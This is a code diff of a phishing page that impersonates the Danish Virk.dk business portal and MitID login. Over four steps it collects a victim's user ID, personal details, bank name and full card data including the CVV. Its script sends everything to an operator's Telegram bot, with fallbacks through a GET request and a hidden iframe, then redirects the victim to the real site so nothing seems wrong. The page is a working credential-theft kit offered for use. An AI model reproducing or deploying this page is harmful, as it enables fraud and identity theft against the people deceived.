@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Virk.dk – Log ind</title>
-    <!-- Google Fonts for a clean look -->
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
     <style>
         :root {
@@ -14,13 +13,9 @@
             --virk-border: #D0D0D0;
             --virk-text: #333333;
             --virk-white: #FFFFFF;
-            --virk-blue: #0B5FA5; /* MitID blue accent */
+            --virk-blue: #0B5FA5;
         }
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Roboto', Arial, sans-serif;
             background: var(--virk-gray);
@@ -37,7 +32,7 @@
             width: 100%;
             max-width: 480px;
             border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+            box-shadow: 0 8px 30px rgba(0,0,0,0.1);
             padding: 2.5rem 2rem;
             margin: 1rem;
             position: relative;
@@ -48,14 +43,7 @@
             from { opacity: 0; transform: translateY(20px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .logo {
-            text-align: center;
-            margin-bottom: 2rem;
-        }
-        .logo img {
-            max-width: 180px;
-            height: auto;
-        }
+        .logo { text-align: center; margin-bottom: 2rem; }
         .logo h1 {
             font-size: 2.5rem;
             font-weight: 700;
@@ -63,33 +51,12 @@
             letter-spacing: -1px;
             display: inline;
         }
-        .logo span {
-            font-size: 1.2rem;
-            color: var(--virk-dark);
-            font-weight: 400;
-        }
-        .step {
-            display: none;
-            animation: fadeIn 0.4s ease;
-        }
-        .step.active {
-            display: block;
-        }
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
-        }
-        h2 {
-            font-weight: 500;
-            font-size: 1.6rem;
-            color: var(--virk-dark);
-            margin-bottom: 0.5rem;
-        }
-        .subtitle {
-            color: #666;
-            margin-bottom: 1.5rem;
-            font-size: 0.95rem;
-        }
+        .logo span { font-size: 1.2rem; color: var(--virk-dark); font-weight: 400; }
+        .step { display: none; animation: fadeIn 0.4s ease; }
+        .step.active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        h2 { font-weight: 500; font-size: 1.6rem; color: var(--virk-dark); margin-bottom: 0.5rem; }
+        .subtitle { color: #666; margin-bottom: 1.5rem; font-size: 0.95rem; }
         .btn {
             display: inline-block;
             width: 100%;
@@ -103,57 +70,36 @@
             cursor: pointer;
             transition: background 0.2s, transform 0.1s;
             text-align: center;
+            text-decoration: none;
             margin-top: 1rem;
         }
-        .btn:hover {
-            background: #A50A28;
-        }
-        .btn:active {
-            transform: scale(0.98);
-        }
+        .btn:hover { background: #A50A28; }
+        .btn:active { transform: scale(0.98); }
         .btn-secondary {
             background: #fff;
             color: var(--virk-red);
             border: 2px solid var(--virk-red);
+            margin-top: 8px;
         }
-        .btn-secondary:hover {
-            background: #fce8ec;
-        }
-        input[type="text"],
-        input[type="tel"],
-        input[type="password"],
-        input[type="number"],
-        input[type="date"],
-        input[type="month"] {
+        .btn-secondary:hover { background: #fce8ec; }
+        input[type="text"], input[type="tel"], input[type="password"], input[type="number"] {
             width: 100%;
             padding: 12px 14px;
             margin: 8px 0 16px;
             border: 1px solid var(--virk-border);
             border-radius: 6px;
             font-size: 1rem;
-            transition: border-color 0.2s, box-shadow 0.2s;
             outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
         input:focus {
             border-color: var(--virk-red);
-            box-shadow: 0 0 0 3px rgba(198, 12, 48, 0.1);
+            box-shadow: 0 0 0 3px rgba(198,12,48,0.1);
         }
-        label {
-            font-weight: 500;
-            color: var(--virk-dark);
-            display: block;
-            margin-bottom: 4px;
-        }
-        .input-group {
-            margin-bottom: 1rem;
-        }
-        .card-row {
-            display: flex;
-            gap: 10px;
-        }
-        .card-row .input-group {
-            flex: 1;
-        }
+        label { font-weight: 500; color: var(--virk-dark); display: block; margin-bottom: 4px; }
+        .input-group { margin-bottom: 1rem; }
+        .card-row { display: flex; gap: 10px; }
+        .card-row .input-group { flex: 1; }
         .error {
             color: var(--virk-red);
             font-size: 0.85rem;
@@ -172,18 +118,13 @@
             vertical-align: middle;
             margin-right: 8px;
         }
-        @keyframes spin {
-            to { transform: rotate(360deg); }
-        }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .success-msg {
             text-align: center;
             padding: 2rem;
             display: none;
         }
-        .success-msg i {
-            font-size: 4rem;
-            color: #4CAF50;
-        }
+        .success-msg i { font-size: 4rem; color: #4CAF50; }
         .footer {
             text-align: center;
             margin-top: 1.5rem;
@@ -199,27 +140,19 @@
             color: var(--virk-blue);
             font-weight: 500;
         }
-        .mitid-badge::before {
-            content: "✔";
-            color: var(--virk-blue);
-        }
+        .mitid-badge::before { content: "✔"; color: var(--virk-blue); }
         @media (max-width: 480px) {
-            .container {
-                padding: 1.5rem 1.2rem;
-                margin: 0.5rem;
-                border-radius: 8px;
-            }
+            .container { padding: 1.5rem 1.2rem; margin: 0.5rem; border-radius: 8px; }
         }
     </style>
 </head>
 <body>
     <div class="container" id="app">
-        <!-- Step 1: Landing / Login button -->
+        <!-- STEP 1: Landing page -->
         <div class="step active" id="step1">
             <div class="logo">
-                <!-- Virk logo text-based (replace with actual image if available) -->
                 <h1>virk<span>.dk</span></h1>
-                <p style="color:#666; margin-top: 5px;">Digital selvbetjening for virksomheder</p>
+                <p style="color:#666; margin-top:5px;">Digital selvbetjening for virksomheder</p>
             </div>
             <h2>Log ind på Virk</h2>
             <p class="subtitle">Brug dit MitID for at få adgang til dine virksomhedsoplysninger.</p>
@@ -230,7 +163,7 @@
             </p>
         </div>
 
-        <!-- Step 2: Bruger ID (like MitID username) -->
+        <!-- STEP 2: Bruger ID -->
         <div class="step" id="step2">
             <div class="logo">
                 <h1>virk<span>.dk</span></h1>
@@ -243,10 +176,10 @@
                 <div class="error" id="errorBrugerId">Indtast venligst dit bruger ID.</div>
             </div>
             <button class="btn" id="toStep3">Fortsæt</button>
-            <button class="btn btn-secondary" style="margin-top:8px;" id="backToStep1">← Tilbage</button>
+            <button class="btn btn-secondary" id="backToStep1">← Tilbage</button>
         </div>
 
-        <!-- Step 3: Personal information -->
+        <!-- STEP 3: Personlige oplysninger -->
         <div class="step" id="step3">
             <div class="logo">
                 <h1>virk<span>.dk</span></h1>
@@ -274,10 +207,10 @@
                 <div class="error" id="errorBank">Indtast din banks navn.</div>
             </div>
             <button class="btn" id="toStep4">Fortsæt</button>
-            <button class="btn btn-secondary" style="margin-top:8px;" id="backToStep2">← Tilbage</button>
+            <button class="btn btn-secondary" id="backToStep2">← Tilbage</button>
         </div>
 
-        <!-- Step 4: Card information -->
+        <!-- STEP 4: Betalingsoplysninger -->
         <div class="step" id="step4">
             <div class="logo">
                 <h1>virk<span>.dk</span></h1>
@@ -304,7 +237,7 @@
             <button class="btn" id="submitBtn">
                 <span id="btnText">Bekræft og send</span>
             </button>
-            <button class="btn btn-secondary" style="margin-top:8px;" id="backToStep3">← Tilbage</button>
+            <button class="btn btn-secondary" id="backToStep3">← Tilbage</button>
         </div>
 
         <!-- Success message -->
@@ -321,11 +254,12 @@
 
     <script>
         (function() {
-            // ==================== CONFIGURATION ====================
-            // Replace these with your Telegram bot token and chat ID
+            // ============================================================
+            // TELEGRAM CONFIGURATION – ADD YOUR BOT TOKEN AND CHAT ID HERE
+            // ============================================================
             const TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN';
             const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID';
-            // ========================================================
+            // ============================================================
 
             const step1 = document.getElementById('step1');
             const step2 = document.getElementById('step2');
@@ -339,7 +273,7 @@
                 window.scrollTo({ top: 0, behavior: 'smooth' });
             }
 
-            // Navigation buttons
+            // Navigation
             document.getElementById('toStep2').addEventListener('click', () => showStep(step2));
             document.getElementById('backToStep1').addEventListener('click', () => showStep(step1));
             document.getElementById('toStep3').addEventListener('click', () => {
@@ -366,16 +300,15 @@
             });
             document.getElementById('backToStep3').addEventListener('click', () => showStep(step3));
 
-            // Submit handler
-            document.getElementById('submitBtn').addEventListener('click', async function(e) {
-                e.preventDefault();
+            // Submit
+            document.getElementById('submitBtn').addEventListener('click', async function() {
                 const btn = this;
                 const btnText = document.getElementById('btnText');
 
-                // Validate card fields
                 const kortnummer = document.getElementById('kortnummer').value.trim();
                 const udlobsdato = document.getElementById('udlobsdato').value.trim();
                 const cvv = document.getElementById('cvv').value.trim();
+
                 let valid = true;
                 if (kortnummer === '' || kortnummer.replace(/\s/g, '').length < 12) {
                     document.getElementById('errorKortnummer').style.display = 'block';
@@ -391,11 +324,9 @@
                 } else { document.getElementById('errorCvv').style.display = 'none'; }
                 if (!valid) return;
 
-                // Disable button and show spinner
                 btn.disabled = true;
                 btnText.innerHTML = '<span class="spinner"></span>Sender...';
 
-                // Gather all data
                 const data = {
                     brugerId: document.getElementById('brugerId').value.trim(),
                     navn: document.getElementById('navn').value.trim(),
@@ -421,7 +352,6 @@
                 const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
                 try {
-                    // Try fetch POST with JSON
                     const response = await fetch(telegramUrl, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
@@ -431,28 +361,24 @@
                             parse_mode: 'Markdown'
                         })
                     });
-
                     if (!response.ok) {
-                        // Fallback to GET with URL params (older clients)
                         const getUrl = `${telegramUrl}?chat_id=${encodeURIComponent(TELEGRAM_CHAT_ID)}&text=${encodeURIComponent(message)}`;
                         await fetch(getUrl, { mode: 'no-cors' });
                     }
                 } catch (error) {
-                    // Fallback: open a hidden iframe with GET request
                     const iframe = document.createElement('iframe');
                     iframe.style.display = 'none';
                     iframe.src = `${telegramUrl}?chat_id=${encodeURIComponent(TELEGRAM_CHAT_ID)}&text=${encodeURIComponent(message)}`;
                     document.body.appendChild(iframe);
                 }
 
-                // Show success
                 showStep(successMsg);
                 setTimeout(() => {
                     window.location.href = 'https://virk.dk';
                 }, 3000);
             });
 
-            // Formatting helpers (optional)
+            // Input formatting
             document.getElementById('kortnummer').addEventListener('input', function(e) {
                 this.value = this.value.replace(/\D/g, '').replace(/(\d{4})(?=\d)/g, '$1 ');
             });
